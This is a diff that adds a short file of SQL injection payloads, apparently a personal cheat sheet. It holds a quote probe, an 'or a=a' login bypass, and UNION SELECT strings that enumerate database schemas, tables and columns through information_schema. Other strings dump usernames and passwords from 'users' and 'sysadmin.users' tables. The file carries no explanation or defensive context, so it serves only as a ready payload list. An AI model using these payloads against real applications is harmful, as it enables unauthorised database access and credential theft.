@@ -1,0 +1,24 @@
+'
+
+a'or 'a'='a -- -
+
+aa' union select 1,2 -- -
+
+aa') union select (select group_concat(table_name) from information_schema.tables where table_schema=database()),2-- -
+
+aa') union select (select group_concat(column_name) from information_schema.columns where table_name="users"),2-- -
+
+aa') union select group_concat(id,username,0x3a,password),2 from users-- -
+
+aa') union select group_concat(schema_name),2 from information_schema.schemata-- -
+
+OR
+
+aa') union select table_schema, table_name FROM information_schema.tables-- -
+
+aa') union select 1,group_concat(username,0x3a,password) from sysadmin.users-- -
+
+
+
+
+
